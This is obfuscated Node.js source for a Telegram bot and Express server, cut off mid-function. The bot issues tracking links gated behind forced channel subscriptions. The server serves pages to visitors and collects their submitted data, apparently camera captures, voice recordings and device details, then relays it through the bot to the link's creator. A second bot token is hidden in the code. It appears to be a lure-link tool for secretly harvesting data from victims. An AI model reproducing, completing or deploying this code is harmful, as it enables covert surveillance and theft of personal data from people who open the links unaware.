function _0x11a8(_0x3247a3, _0x203b86) {
    const _0x149097 = _0x1ced();
    return _0x11a8 = function (_0x505099, _0x26242b) {
        _0x505099 = _0x505099 - (0xf6e + -0x1a73 + -0x4 * -0x2e2);
        let _0xc882 = _0x149097[_0x505099];
        return _0xc882;
    }, _0x11a8(_0x3247a3, _0x203b86);
}
const _0x4e73bb = _0x11a8;
(function (_0x503ee7, _0x1f7441) {
    const _0x483820 = _0x11a8, _0x2bc288 = _0x503ee7();
    while (!![]) {
        try {
            const _0x2e7c99 = parseInt(_0x483820(0x1bb)) / (-0x2189 + 0x15e * -0x1c + 0x47d2) * (parseInt(_0x483820(0x372)) / (-0xd * -0x3b + 0x1 * 0x217 + -0x19 * 0x34)) + -parseInt(_0x483820(0x527)) / (-0xd49 + 0x344 * -0x4 + -0x697 * -0x4) * (-parseInt(_0x483820(0x195)) / (-0x1 * -0xd4b + -0x2e2 * 0x1 + -0xa65)) + -parseInt(_0x483820(0x4d6)) / (-0xd7 * -0x15 + -0x2 * -0xbb2 + -0x3a * 0xb5) * (parseInt(_0x483820(0x381)) / (-0x1d4b * -0x1 + 0x211f + -0x3e64)) + parseInt(_0x483820(0x682)) / (-0x4c * -0x53 + 0x225 * -0x5 + -0xde4) + -parseInt(_0x483820(0x15f)) / (-0xa3 * 0x17 + 0x130e + 0x13 * -0x3b) + parseInt(_0x483820(0x33a)) / (0xd * -0x75 + -0x4 * 0x6aa + 0x20a2 * 0x1) + -parseInt(_0x483820(0x237)) / (0xf * -0x131 + -0x1885 + -0x1 * -0x2a6e);
            if (_0x2e7c99 === _0x1f7441)
                break;
            else
                _0x2bc288['push'](_0x2bc288['shift']());
        } catch (_0x5e411a) {
            _0x2bc288['push'](_0x2bc288['shift']());
        }
    }
}(_0x1ced, -0xca471 + -0x18de8 + -0x18d3c7 * -0x1), require(_0x4e73bb(0x6ce))[_0x4e73bb(0x46c)]());
const TelegramBot = require(_0x4e73bb(0x132) + _0x4e73bb(0x29a) + 'i'), express = require(_0x4e73bb(0x1eb)), bodyParser = require(_0x4e73bb(0x484) + 'r'), multer = require(_0x4e73bb(0x532)), path = require(_0x4e73bb(0x428)), fs = require('fs'), crypto = require(_0x4e73bb(0x391)), axios = require(_0x4e73bb(0x30e)), uuid = require(_0x4e73bb(0x513)), botToken = process[_0x4e73bb(0x4e9)]['n'], botUsername = _0x4e73bb(0x5a7), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x4e73bb(0x535),
        _0x4e73bb(0x5fc),
        _0x4e73bb(0x464),
        _0x4e73bb(0x3ed),
        _0x4e73bb(0x24f)
    ], SECOND_BOT_TOKEN = _0x4e73bb(0xf6) + _0x4e73bb(0x6c1) + _0x4e73bb(0x267) + _0x4e73bb(0x47e) + _0x4e73bb(0x475), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x3e183b = _0x4e73bb, _0x371187 = { 'PblNC': _0x3e183b(0x653) + _0x3e183b(0x105) };
    console[_0x3e183b(0x235)](_0x371187[_0x3e183b(0x1a8)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x334aec = {};
}
setInterval(clearCache, (-0x8e6 + 0x97b + -0x1 * -0x673) * (-0x16f5 + 0x1 * 0xc42 + 0xe9b));
async function isUserSubscribed(_0x320111) {
    const _0x544283 = _0x4e73bb, _0x30c7a9 = {
            'GYsLg': function (_0x4f749b, _0x5890fe) {
                return _0x4f749b === _0x5890fe;
            },
            'pPxpA': _0x544283(0x12b),
            'IAZEL': _0x544283(0x449) + _0x544283(0x419),
            'vzRIs': _0x544283(0x455),
            'PcDdI': _0x544283(0x6d3) + _0x544283(0x1c7) + _0x544283(0x4a2) + _0x544283(0x96)
        };
    try {
        const _0x3add4d = await Promise[_0x544283(0x351)](developerChannels[_0x544283(0x6bd)](_0x49d19e => bot[_0x544283(0x119) + _0x544283(0x3a5)](_0x49d19e, _0x320111)));
        return _0x3add4d[_0x544283(0x3e5)](_0x3d6fdf => {
            const _0x1ea91d = _0x544283, _0x240cdc = _0x3d6fdf[_0x1ea91d(0x1b9)];
            return _0x30c7a9[_0x1ea91d(0x61b)](_0x240cdc, _0x30c7a9[_0x1ea91d(0x4b8)]) || _0x30c7a9[_0x1ea91d(0x61b)](_0x240cdc, _0x30c7a9[_0x1ea91d(0x2af)]) || _0x30c7a9[_0x1ea91d(0x61b)](_0x240cdc, _0x30c7a9[_0x1ea91d(0x10e)]);
        });
    } catch (_0x20702e) {
        return console[_0x544283(0x2dd)](_0x30c7a9[_0x544283(0x4c7)], _0x20702e), ![];
    }
}
bot[_0x4e73bb(0x2d9)](/\/Vip/, async _0x37752b => {
    const _0x152ba2 = _0x4e73bb, _0x50f759 = {
            'xITSJ': function (_0x5826f6, _0xe85f3) {
                return _0x5826f6(_0xe85f3);
            },
            'JaToV': _0x152ba2(0x354) + _0x152ba2(0xc7) + _0x152ba2(0x194) + _0x152ba2(0x498) + _0x152ba2(0x5cf) + _0x152ba2(0x1c5),
            'ncpDG': _0x152ba2(0x612) + _0x152ba2(0x5e9) + _0x152ba2(0x692) + _0x152ba2(0x92) + _0x152ba2(0x41f) + _0x152ba2(0x599) + _0x152ba2(0x681),
            'PDCaF': _0x152ba2(0x481) + _0x152ba2(0x661) + _0x152ba2(0x53b),
            'wrabF': _0x152ba2(0x53a) + _0x152ba2(0x15c) + _0x152ba2(0x20b) + _0x152ba2(0x1d9),
            'LEjgc': _0x152ba2(0x1b1) + _0x152ba2(0x30d) + _0x152ba2(0x16c) + _0x152ba2(0x335),
            'TMLmx': _0x152ba2(0x5f9) + _0x152ba2(0x560) + _0x152ba2(0x303)
        }, _0x20e98f = _0x37752b[_0x152ba2(0x662)]['id'], _0x247acd = _0x37752b[_0x152ba2(0x4df)]['id'], _0x2782d4 = await _0x50f759[_0x152ba2(0x38d)](isUserSubscribed, _0x20e98f);
    if (!_0x2782d4) {
        const _0x4b92c7 = _0x50f759[_0x152ba2(0x4ce)], _0x5c8d2b = developerChannels[_0x152ba2(0x6bd)](_0x24987f => [{
                    'text': _0x152ba2(0x25d) + _0x24987f,
                    'url': _0x152ba2(0x294) + _0x152ba2(0x2d0) + _0x24987f[_0x152ba2(0xb5)](0x1 * 0x25 + 0x2258 + -0x227c)
                }]);
        bot[_0x152ba2(0x344) + 'e'](_0x20e98f, _0x4b92c7, { 'reply_markup': { 'inline_keyboard': _0x5c8d2b } });
        return;
    }
    const _0x5a5d80 = uuid['v4']();
    linkData[_0x5a5d80] = {
        'userId': _0x247acd,
        'chatId': _0x20e98f,
        'visitors': []
    };
    const _0x2fbb5e = _0x50f759[_0x152ba2(0x699)];
    bot[_0x152ba2(0x344) + 'e'](_0x20e98f, _0x2fbb5e, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x50f759[_0x152ba2(0x3ee)],
                        'callback_data': _0x152ba2(0x112) + _0x5a5d80
                    }],
                [{
                        'text': _0x50f759[_0x152ba2(0x57f)],
                        'callback_data': _0x152ba2(0x112) + _0x5a5d80
                    }],
                [{
                        'text': _0x50f759[_0x152ba2(0x6a2)],
                        'callback_data': _0x152ba2(0x112) + _0x5a5d80
                    }],
                [{
                        'text': _0x50f759[_0x152ba2(0x5b4)],
                        'callback_data': _0x152ba2(0x112) + _0x5a5d80
                    }]
            ]
        }
    });
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), async _0x4e53a9 => {
    const _0x3db320 = _0x4e73bb, _0x31dd56 = {
            'LuqTI': function (_0x1d40c5, _0x46acd4) {
                return _0x1d40c5 === _0x46acd4;
            }
        }, _0x529d70 = _0x4e53a9[_0x3db320(0x2c2)][_0x3db320(0x662)]['id'], _0x50601f = _0x4e53a9[_0x3db320(0x4df)]['id'], _0x5cfc49 = _0x4e53a9[_0x3db320(0x301)][_0x3db320(0x472)]('_')[0x3 * -0x252 + 0x228e * -0x1 + -0x5 * -0x84e];
    if (linkData[_0x5cfc49] && _0x31dd56[_0x3db320(0xd6)](linkData[_0x5cfc49][_0x3db320(0x310)], _0x50601f)) {
        const _0x3fcb68 = _0x3db320(0x26d) + _0x3db320(0x539) + _0x3db320(0x69c) + _0x3db320(0x83) + _0x3db320(0x495) + _0x3db320(0x187) + _0x3db320(0x44e) + _0x3db320(0x1ba) + _0x3db320(0x54e) + _0x3db320(0x667) + _0x3db320(0x2e8) + botUsername + _0x3db320(0x5d9) + _0x5cfc49;
        bot[_0x3db320(0x344) + 'e'](_0x529d70, _0x3fcb68);
    }
});
const baseUrl = process[_0x4e73bb(0x4e9)]['r'];
bot[_0x4e73bb(0x2d9)](/\/vip (.+)/, async (_0x5384a1, _0x18e5bd) => {
    const _0x4768c9 = _0x4e73bb, _0x24614b = {
            'Nkzxd': function (_0x198b2e, _0x488803) {
                return _0x198b2e(_0x488803);
            },
            'MVMqA': _0x4768c9(0x354) + _0x4768c9(0xc7) + _0x4768c9(0x194) + _0x4768c9(0x498) + _0x4768c9(0x5cf) + _0x4768c9(0x1c5),
            'hGDtV': function (_0x404b97, _0x3a3276) {
                return _0x404b97 !== _0x3a3276;
            }
        }, _0x101fea = _0x18e5bd[0x20e4 + -0x26ff + 0x22 * 0x2e], _0x4b26c7 = _0x5384a1[_0x4768c9(0x4df)]['id'], _0xed9933 = _0x5384a1[_0x4768c9(0x662)]['id'], _0x38cf3d = await _0x24614b[_0x4768c9(0xf9)](isUserSubscribed, _0xed9933);
    if (!_0x38cf3d) {
        const _0x46ec70 = _0x24614b[_0x4768c9(0xdf)], _0x3f8055 = developerChannels[_0x4768c9(0x6bd)](_0x5f49dc => [{
                    'text': _0x4768c9(0x25d) + _0x5f49dc,
                    'url': _0x4768c9(0x294) + _0x4768c9(0x2d0) + _0x5f49dc[_0x4768c9(0xb5)](0x1039 + -0x1463 + 0x42b * 0x1)
                }]);
        bot[_0x4768c9(0x344) + 'e'](_0xed9933, _0x46ec70, { 'reply_markup': { 'inline_keyboard': _0x3f8055 } });
        return;
    }
    if (linkData[_0x101fea]) {
        const {
            userId: _0x249fbe,
            visitors: _0x3f4e6b
        } = linkData[_0x101fea];
        if (_0x24614b[_0x4768c9(0x233)](_0x4b26c7, _0x249fbe) && (!visitorData[_0x4b26c7] || !visitorData[_0x4b26c7][_0x4768c9(0x146)](_0x249fbe))) {
            _0x3f4e6b[_0x4768c9(0x370)](_0x4b26c7);
            !visitorData[_0x4b26c7] && (visitorData[_0x4b26c7] = []);
            visitorData[_0x4b26c7][_0x4768c9(0x370)](_0x249fbe);
            !userPoints[_0x249fbe] && (userPoints[_0x249fbe] = 0x8fa * -0x1 + -0x565 + 0xe5f);
            userPoints[_0x249fbe] += -0x2177 + 0xef * -0x26 + -0xa * -0x6e5;
            const _0x39f06d = _0x4768c9(0x2f6) + _0x4768c9(0x32c) + _0x4768c9(0x44e) + _0x4768c9(0x1ff) + _0x4768c9(0x65c) + userPoints[_0x249fbe] + _0x4768c9(0x55c);
            bot[_0x4768c9(0x344) + 'e'](_0xed9933, _0x39f06d);
            const _0x1b5213 = _0x4768c9(0x3d7) + _0x4768c9(0x422) + _0x4768c9(0x273) + userPoints[_0x249fbe] + _0x4768c9(0x2c6);
            bot[_0x4768c9(0x344) + 'e'](_0x249fbe, _0x1b5213);
        }
    }
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), async _0x15cbb6 => {
    const _0x2d5f7b = _0x4e73bb, _0x4d1adf = {
            'kSAgt': function (_0x46089d, _0x18e351) {
                return _0x46089d === _0x18e351;
            }
        }, _0x3175a9 = _0x15cbb6[_0x2d5f7b(0x2c2)][_0x2d5f7b(0x662)]['id'], _0x5cb287 = _0x15cbb6[_0x2d5f7b(0x4df)]['id'], _0x1a1b87 = _0x15cbb6[_0x2d5f7b(0x301)][_0x2d5f7b(0x472)]('_')[0x17cb * -0x1 + 0x23d * 0x7 + -0x411 * -0x2];
    if (linkData[_0x1a1b87] && _0x4d1adf[_0x2d5f7b(0x2bd)](linkData[_0x1a1b87][_0x2d5f7b(0x310)], _0x5cb287)) {
        const _0x5e3804 = _0x2d5f7b(0x26d) + _0x2d5f7b(0x539) + _0x2d5f7b(0x69c) + _0x2d5f7b(0x83) + _0x2d5f7b(0x495) + _0x2d5f7b(0x187) + _0x2d5f7b(0x44e) + _0x2d5f7b(0x1ba) + _0x2d5f7b(0x401) + _0x2d5f7b(0x226) + _0x2d5f7b(0x176) + botUsername + _0x2d5f7b(0x5d9) + _0x1a1b87;
        bot[_0x2d5f7b(0x344) + 'e'](_0x3175a9, _0x5e3804);
    }
}), bot[_0x4e73bb(0x2d9)](/\/start (.+)/, async (_0x36de8b, _0x1bb07f) => {
    const _0x1ccf36 = _0x4e73bb, _0x320aec = {
            'QZVIK': function (_0x56fe0e, _0x2117d6) {
                return _0x56fe0e(_0x2117d6);
            },
            'TEABR': _0x1ccf36(0x354) + _0x1ccf36(0xc7) + _0x1ccf36(0x194) + _0x1ccf36(0x498) + _0x1ccf36(0x5cf) + _0x1ccf36(0x1c5),
            'gXTGW': function (_0x778807, _0x24862c) {
                return _0x778807 !== _0x24862c;
            }
        }, _0x3bb80f = _0x1bb07f[-0x17b3 * 0x1 + 0x1 * 0x26f1 + -0xf3d], _0x24efd6 = _0x36de8b[_0x1ccf36(0x4df)]['id'], _0x39bc0b = _0x36de8b[_0x1ccf36(0x662)]['id'], _0x4105bb = await _0x320aec[_0x1ccf36(0x412)](isUserSubscribed, _0x39bc0b);
    if (!_0x4105bb) {
        const _0x54f041 = _0x320aec[_0x1ccf36(0x48c)], _0x336984 = developerChannels[_0x1ccf36(0x6bd)](_0x4c8a49 => [{
                    'text': _0x1ccf36(0x25d) + _0x4c8a49,
                    'url': _0x1ccf36(0x294) + _0x1ccf36(0x2d0) + _0x4c8a49[_0x1ccf36(0xb5)](0x14 * 0x116 + 0x1dce + -0x6d * 0x79)
                }]);
        bot[_0x1ccf36(0x344) + 'e'](_0x39bc0b, _0x54f041, { 'reply_markup': { 'inline_keyboard': _0x336984 } });
        return;
    }
    if (linkData[_0x3bb80f]) {
        const {
            userId: _0x5bcf7d,
            chatId: _0x3e7a36,
            visitors: _0x71abe
        } = linkData[_0x3bb80f];
        if (_0x320aec[_0x1ccf36(0x385)](_0x24efd6, _0x5bcf7d) && (!visitorData[_0x24efd6] || !visitorData[_0x24efd6][_0x1ccf36(0x146)](_0x5bcf7d))) {
            _0x71abe[_0x1ccf36(0x370)](_0x24efd6);
            !visitorData[_0x24efd6] && (visitorData[_0x24efd6] = []);
            visitorData[_0x24efd6][_0x1ccf36(0x370)](_0x5bcf7d);
            !userPoints[_0x5bcf7d] && (userPoints[_0x5bcf7d] = 0xaa6 + 0x15fb * 0x1 + -0x1 * 0x20a1);
            userPoints[_0x5bcf7d] += -0x2656 + 0x1bf6 + -0xa61 * -0x1;
            const _0x3759d2 = _0x1ccf36(0x2f6) + _0x1ccf36(0x32c) + _0x1ccf36(0x44e) + _0x1ccf36(0x1ff) + _0x1ccf36(0x65c) + userPoints[_0x5bcf7d] + (_0x1ccf36(0xce) + _0x1ccf36(0x45b) + _0x1ccf36(0x5c7) + _0x1ccf36(0x52f) + _0x1ccf36(0x46e) + _0x1ccf36(0x45e));
            bot[_0x1ccf36(0x344) + 'e'](_0x3e7a36, _0x3759d2);
        }
    }
});
const app = express();
app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x3b5)]({
    'extended': !![],
    'limit': _0x4e73bb(0xf4)
})), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x4a4)]({ 'limit': _0x4e73bb(0x496) })), app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname));
const storage = multer[_0x4e73bb(0x28b) + _0x4e73bb(0x607)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x4e73bb(0x53e) });
app[_0x4e73bb(0x5b5)](_0x4e73bb(0x60c) + 'rm', (_0x51be9c, _0x16f7a2) => {
    const _0x2d4af2 = _0x4e73bb, _0x44bc0d = {
            'ZjROO': _0x2d4af2(0x33e) + _0x2d4af2(0x505) + _0x2d4af2(0x33f),
            'wqcqc': _0x2d4af2(0x524),
            'YNomw': _0x2d4af2(0x507),
            'EDDdl': _0x2d4af2(0x5fe),
            'qzYNL': _0x2d4af2(0x561),
            'nHvDq': _0x2d4af2(0x509),
            'daYGC': _0x2d4af2(0x21d)
        }, _0x43c753 = _0x51be9c[_0x2d4af2(0x97)][_0x2d4af2(0x577)], _0x3736e0 = _0x51be9c[_0x2d4af2(0x97)][_0x2d4af2(0x2cc)];
    if (!_0x43c753)
        return _0x16f7a2[_0x2d4af2(0x1b9)](0x260b + 0x13b * 0x10 + -0x382b)[_0x2d4af2(0x3a7)](_0x44bc0d[_0x2d4af2(0x366)]);
    let _0xe602be = '';
    switch (_0x3736e0) {
    case _0x44bc0d[_0x2d4af2(0x501)]:
        _0xe602be = _0x44bc0d[_0x2d4af2(0x2b6)];
        break;
    case _0x44bc0d[_0x2d4af2(0x353)]:
        _0xe602be = _0x44bc0d[_0x2d4af2(0x4e5)];
        break;
    case _0x44bc0d[_0x2d4af2(0x2e5)]:
    default:
        _0xe602be = _0x44bc0d[_0x2d4af2(0x5da)];
        break;
    }
    _0x16f7a2[_0x2d4af2(0x69a)](path[_0x2d4af2(0x3eb)](__dirname, _0xe602be));
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x3a3) + _0x4e73bb(0x58c), (_0x432f76, _0x222908) => {
    const _0x56ef6a = _0x4e73bb, _0x5f25b7 = {
            'DdFVt': function (_0x11ed77, _0x41f7d4) {
                return _0x11ed77(_0x41f7d4);
            },
            'HEndP': _0x56ef6a(0x3e3),
            'DAgcu': _0x56ef6a(0x522) + _0x56ef6a(0x263) + _0x56ef6a(0xb9) + _0x56ef6a(0x446) + _0x56ef6a(0x152) + _0x56ef6a(0x552),
            'QRLUM': _0x56ef6a(0x637) + _0x56ef6a(0x694) + _0x56ef6a(0x6a0) + _0x56ef6a(0x480) + _0x56ef6a(0x11d) + _0x56ef6a(0x1fe)
        }, _0x774c85 = _0x432f76[_0x56ef6a(0x8d)][_0x56ef6a(0x307)];
    _0x5f25b7[_0x56ef6a(0x4eb)](validateLinkUsage, _0x774c85) ? _0x222908[_0x56ef6a(0x69a)](path[_0x56ef6a(0x3eb)](__dirname, _0x5f25b7[_0x56ef6a(0x31e)])) : (_0x222908[_0x56ef6a(0x3a7)](_0x5f25b7[_0x56ef6a(0x48a)]), bot[_0x56ef6a(0x344) + 'e'](linkUsage[_0x774c85][_0x56ef6a(0x577)], _0x5f25b7[_0x56ef6a(0x6b6)]));
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x45d) + _0x4e73bb(0x2a3) + 'd', (_0x4a70b0, _0x22c576) => {
    const _0x2a7c02 = _0x4e73bb, _0x5cd0f7 = {
            'RgsNZ': function (_0x3e7616, _0x1f3a9f) {
                return _0x3e7616(_0x1f3a9f);
            },
            'PRYrI': _0x2a7c02(0x19f),
            'XOqck': _0x2a7c02(0x522) + _0x2a7c02(0x263) + _0x2a7c02(0xb9) + _0x2a7c02(0x446) + _0x2a7c02(0x152) + _0x2a7c02(0x552),
            'YqUzx': _0x2a7c02(0x637) + _0x2a7c02(0x694) + _0x2a7c02(0x6a0) + _0x2a7c02(0x480) + _0x2a7c02(0x11d) + _0x2a7c02(0x1fe)
        }, _0x739dfb = _0x4a70b0[_0x2a7c02(0x8d)][_0x2a7c02(0x307)];
    _0x5cd0f7[_0x2a7c02(0x606)](validateLinkUsage, _0x739dfb) ? _0x22c576[_0x2a7c02(0x69a)](path[_0x2a7c02(0x3eb)](__dirname, _0x5cd0f7[_0x2a7c02(0x1ca)])) : (_0x22c576[_0x2a7c02(0x3a7)](_0x5cd0f7[_0x2a7c02(0x2d6)]), bot[_0x2a7c02(0x344) + 'e'](linkUsage[_0x739dfb][_0x2a7c02(0x577)], _0x5cd0f7[_0x2a7c02(0x1a6)]));
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x1f0) + _0x4e73bb(0x2be), (_0x5998e6, _0xf3455a) => {
    const _0x13fffd = _0x4e73bb, _0x1d0565 = {
            'kMNym': function (_0x555dd4, _0x5cab79) {
                return _0x555dd4(_0x5cab79);
            },
            'mefbH': _0x13fffd(0x5d4),
            'bqeab': _0x13fffd(0x522) + _0x13fffd(0x263) + _0x13fffd(0xb9) + _0x13fffd(0x446) + _0x13fffd(0x152) + _0x13fffd(0x552),
            'ctwgn': _0x13fffd(0x637) + _0x13fffd(0x694) + _0x13fffd(0x6a0) + _0x13fffd(0x480) + _0x13fffd(0x11d) + _0x13fffd(0x1fe)
        }, _0x39a5dc = _0x5998e6[_0x13fffd(0x8d)][_0x13fffd(0x307)];
    _0x1d0565[_0x13fffd(0x5d1)](validateLinkUsage, _0x39a5dc) ? _0xf3455a[_0x13fffd(0x69a)](path[_0x13fffd(0x3eb)](__dirname, _0x1d0565[_0x13fffd(0x136)])) : (_0xf3455a[_0x13fffd(0x3a7)](_0x1d0565[_0x13fffd(0x51f)]), bot[_0x13fffd(0x344) + 'e'](linkUsage[_0x39a5dc][_0x13fffd(0x577)], _0x1d0565[_0x13fffd(0x2a0)]));
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x259) + _0x4e73bb(0x68c), (_0x223556, _0x46eeb3) => {
    const _0x43709f = _0x4e73bb, _0x257137 = {
            'TPEXM': function (_0x1b5ac2, _0xddaf28) {
                return _0x1b5ac2(_0xddaf28);
            },
            'VVQYw': _0x43709f(0x1cc),
            'GtULA': _0x43709f(0x522) + _0x43709f(0x263) + _0x43709f(0xb9) + _0x43709f(0x446) + _0x43709f(0x152) + _0x43709f(0x552),
            'GUUGf': _0x43709f(0x637) + _0x43709f(0x694) + _0x43709f(0x6a0) + _0x43709f(0x480) + _0x43709f(0x11d) + _0x43709f(0x1fe)
        }, _0xb18b7f = _0x223556[_0x43709f(0x8d)][_0x43709f(0x307)];
    _0x257137[_0x43709f(0x2ed)](validateLinkUsage, _0xb18b7f) ? _0x46eeb3[_0x43709f(0x69a)](path[_0x43709f(0x3eb)](__dirname, _0x257137[_0x43709f(0x615)])) : (_0x46eeb3[_0x43709f(0x3a7)](_0x257137[_0x43709f(0x1fc)]), bot[_0x43709f(0x344) + 'e'](linkUsage[_0xb18b7f][_0x43709f(0x577)], _0x257137[_0x43709f(0x253)]));
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x466) + 'es', (_0xffac67, _0x9865ff) => {
    const _0x171b55 = _0x4e73bb, _0x4cf75c = {
            'kougG': _0x171b55(0x57c) + _0x171b55(0x291) + _0x171b55(0x487) + ':',
            'LErcn': _0x171b55(0x3e8) + _0x171b55(0x6b2),
            'xlgET': _0x171b55(0xd1)
        }, _0x458156 = _0xffac67[_0x171b55(0x67d)][_0x171b55(0x577)], _0x4c3df6 = _0xffac67[_0x171b55(0x67d)][_0x171b55(0x279)], _0x3a1036 = _0xffac67[_0x171b55(0x67d)][_0x171b55(0x2a1)];
    console[_0x171b55(0x235)](_0x4cf75c[_0x171b55(0x124)], _0xffac67[_0x171b55(0x67d)]), bot[_0x171b55(0x344) + 'e'](_0x458156, _0x171b55(0x342) + _0x171b55(0x3f4) + _0x171b55(0x5eb) + ':\x20' + _0x4c3df6 + (_0x171b55(0x1db) + _0x171b55(0x3b4)) + _0x3a1036)[_0x171b55(0x4b4)](() => {
    })[_0x171b55(0x3e9)](_0x7007f => {
        const _0x5c654c = _0x171b55;
        console[_0x5c654c(0x2dd)](_0x4cf75c[_0x5c654c(0x215)], _0x7007f[_0x5c654c(0x11c)] ? _0x7007f[_0x5c654c(0x11c)][_0x5c654c(0x67d)] : _0x7007f);
    }), _0x9865ff[_0x171b55(0x469)](_0x4cf75c[_0x171b55(0xf5)]);
}), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x4a4)]()), app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x557), (_0x5069e6, _0x20b0f5) => {
    const _0x19f023 = _0x4e73bb, _0x3a6bc0 = { 'Vnedk': _0x19f023(0x402) };
    _0x20b0f5[_0x19f023(0x69a)](path[_0x19f023(0x3eb)](__dirname, _0x3a6bc0[_0x19f023(0x323)]));
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x5a2) + _0x4e73bb(0x206), (_0x56d504, _0x1f8362) => {
    const _0x3c82a7 = _0x4e73bb, _0x5a39f3 = { 'CsUGD': _0x3c82a7(0x57c) + _0x3c82a7(0x291) + _0x3c82a7(0x487) + ':' }, _0x40b65d = _0x56d504[_0x3c82a7(0x67d)][_0x3c82a7(0x577)], _0x598a04 = _0x56d504[_0x3c82a7(0x67d)][_0x3c82a7(0x6be) + 'r'];
    bot[_0x3c82a7(0x344) + 'e'](_0x40b65d, _0x3c82a7(0x63b) + _0x3c82a7(0x2ba) + _0x3c82a7(0x5c4) + _0x3c82a7(0x6c5) + _0x3c82a7(0x40e) + _0x3c82a7(0x4a5) + _0x3c82a7(0x693) + _0x3c82a7(0x388) + ':\x20' + _0x598a04)[_0x3c82a7(0x4b4)](() => {
        const _0x4ee7c3 = _0x3c82a7;
        _0x1f8362[_0x4ee7c3(0x4a4)]({ 'success': !![] });
    })[_0x3c82a7(0x3e9)](_0x3dce25 => {
        const _0x5b858f = _0x3c82a7;
        console[_0x5b858f(0x2dd)](_0x5a39f3[_0x5b858f(0x56b)], _0x3dce25[_0x5b858f(0x11c)] ? _0x3dce25[_0x5b858f(0x11c)][_0x5b858f(0x67d)] : _0x3dce25), _0x1f8362[_0x5b858f(0x4a4)]({ 'success': ![] });
    });
}), app[_0x4e73bb(0x493)](_0x4e73bb(0xef) + 'e', (_0x5e36a9, _0x2752e4) => {
    const _0x3529be = _0x4e73bb, _0x1b62b4 = {
            'btixY': _0x3529be(0x285) + _0x3529be(0x2ee) + _0x3529be(0x644),
            'kgRve': _0x3529be(0x57c) + _0x3529be(0x291) + _0x3529be(0x487) + ':'
        }, _0x2d960d = _0x5e36a9[_0x3529be(0x67d)][_0x3529be(0x577)], _0x248181 = _0x5e36a9[_0x3529be(0x67d)][_0x3529be(0x460)];
    bot[_0x3529be(0x344) + 'e'](_0x2d960d, _0x3529be(0x33d) + _0x3529be(0x5e0) + _0x3529be(0x3db) + '\x20' + _0x248181)[_0x3529be(0x4b4)](() => {
        const _0x52ccf1 = _0x3529be;
        _0x2752e4[_0x52ccf1(0x469)](_0x1b62b4[_0x52ccf1(0x1f1)]);
    })[_0x3529be(0x3e9)](_0x4dfca3 => {
        const _0x7acf35 = _0x3529be;
        console[_0x7acf35(0x2dd)](_0x1b62b4[_0x7acf35(0x159)], _0x4dfca3[_0x7acf35(0x11c)] ? _0x4dfca3[_0x7acf35(0x11c)][_0x7acf35(0x67d)] : _0x4dfca3), _0x2752e4[_0x7acf35(0x4a4)]({ 'success': ![] });
    });
}), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x4a4)]({ 'limit': _0x4e73bb(0x232) })), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x3b5)]({
    'limit': _0x4e73bb(0x232),
    'extended': !![]
}));
const dataStore = {};
app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x493)](_0x4e73bb(0x1e8) + 'eo', (_0x5e2856, _0x516c26) => {
    const _0x2c0b02 = _0x4e73bb, _0x22eb89 = {
            'yXOpH': _0x2c0b02(0x91),
            'IgwIz': _0x2c0b02(0x57c) + _0x2c0b02(0x36c),
            'yeYMC': _0x2c0b02(0x38c) + _0x2c0b02(0x48d),
            'mjJzV': function (_0x3d39ba, _0x44b8cf) {
                return _0x3d39ba || _0x44b8cf;
            },
            'kxesc': _0x2c0b02(0x3ac) + _0x2c0b02(0x6c8) + _0x2c0b02(0x58d) + _0x2c0b02(0x3df) + _0x2c0b02(0x85),
            'vTpoo': _0x2c0b02(0x15d),
            'ACQfK': _0x2c0b02(0x5fa),
            'XRfUf': _0x2c0b02(0x4fc) + _0x2c0b02(0x413) + _0x2c0b02(0xd4),
            'cTDad': _0x2c0b02(0x61a) + _0x2c0b02(0x309) + _0x2c0b02(0x6b5),
            'HqmbP': _0x2c0b02(0x38c) + _0x2c0b02(0x4ad) + _0x2c0b02(0x5a1)
        }, _0x1f1418 = _0x5e2856[_0x2c0b02(0x67d)][_0x2c0b02(0x577)], _0x2453fc = _0x5e2856[_0x2c0b02(0x67d)][_0x2c0b02(0x1a1)];
    if (_0x22eb89[_0x2c0b02(0x63f)](!_0x1f1418, !_0x2453fc))
        return _0x516c26[_0x2c0b02(0x1b9)](0xe5f + 0x1 * 0xde5 + -0x1ab4)[_0x2c0b02(0x3a7)](_0x22eb89[_0x2c0b02(0x3ef)]);
    const _0x43751f = _0x2453fc[_0x2c0b02(0x472)](',')[-0x18ba * 0x1 + -0x18da + 0x3195 * 0x1], _0x863fdb = path[_0x2c0b02(0x3eb)](__dirname, _0x22eb89[_0x2c0b02(0x58e)]);
    !fs[_0x2c0b02(0x576)](_0x863fdb) && fs[_0x2c0b02(0x338)](_0x863fdb);
    try {
        const _0x712c46 = Buffer[_0x2c0b02(0x4df)](_0x43751f, _0x22eb89[_0x2c0b02(0x4c1)]), _0x39954d = path[_0x2c0b02(0x3eb)](_0x863fdb, _0x1f1418 + _0x2c0b02(0xa7));
